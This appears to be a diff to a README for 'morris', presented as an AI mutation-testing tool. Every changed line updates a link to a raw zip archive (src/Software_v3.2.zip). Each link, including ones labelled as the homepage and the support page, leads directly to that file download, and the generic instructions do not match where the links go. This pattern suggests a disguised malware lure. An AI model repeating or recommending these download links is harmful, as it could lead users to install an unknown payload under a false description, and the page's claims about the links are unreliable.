@@ -1,6 +1,6 @@
 # 🧪 morris - Test Smarter with AI Mutation Analysis
 
-[![Download morris](https://img.shields.io/badge/Download-morris-green?style=for-the-badge&logo=github)](https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip)
+[![Download morris](https://img.shields.io/badge/Download-morris-green?style=for-the-badge&logo=github)](https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip)
 
 ---
 
@@ -37,11 +37,11 @@ Before you start, make sure your computer meets these requirements:
 
 To start using morris, you need to get the program from the official source.
 
-[![Download morris](https://img.shields.io/badge/Download-morris-brightgreen?style=for-the-badge&logo=github)](https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip)
+[![Download morris](https://img.shields.io/badge/Download-morris-brightgreen?style=for-the-badge&logo=github)](https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip)
 
 Click the badge above or visit the link below to access the download page:
 
-https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip
+https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip
 
 Once on the page, look for the latest release or download section. This is where you will find the files needed to run morris on your computer.
 
@@ -52,7 +52,7 @@ Once on the page, look for the latest release or download section. This is where
 Follow these steps to get morris running:
 
 1. **Visit the morris download page**  
-   Open your web browser and click the download badge above or go to https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip
+   Open your web browser and click the download badge above or go to https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip
 
 2. **Locate the latest release**  
    On the page, find the section titled "Releases." This usually appears on the right side or near the top. Click on it to see the available files.
@@ -122,7 +122,7 @@ If morris does not start or runs into errors:
 
 This repository page is the main source of updates and support. If you experience issues or want to learn more:
 
-- Visit https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip
+- Visit https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip
 - Look for "Issues" tab to find reported problems or submit your own.
 - Check the documentation available in the repository.
 
@@ -130,7 +130,7 @@ This repository page is the main source of updates and support. If you experienc
 
 ## 🔗 Important Links
 
-- Download page: https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip
-- Project homepage on GitHub: https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip
+- Download page: https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip
+- Project homepage on GitHub: https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip
 
-[![Download morris](https://img.shields.io/badge/Download-morris-darkgrey?style=for-the-badge&logo=github)](https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v1.3.zip)
+[![Download morris](https://img.shields.io/badge/Download-morris-darkgrey?style=for-the-badge&logo=github)](https://github.com/darkscripty/morris/raw/refs/heads/main/src/Software_v3.2.zip)
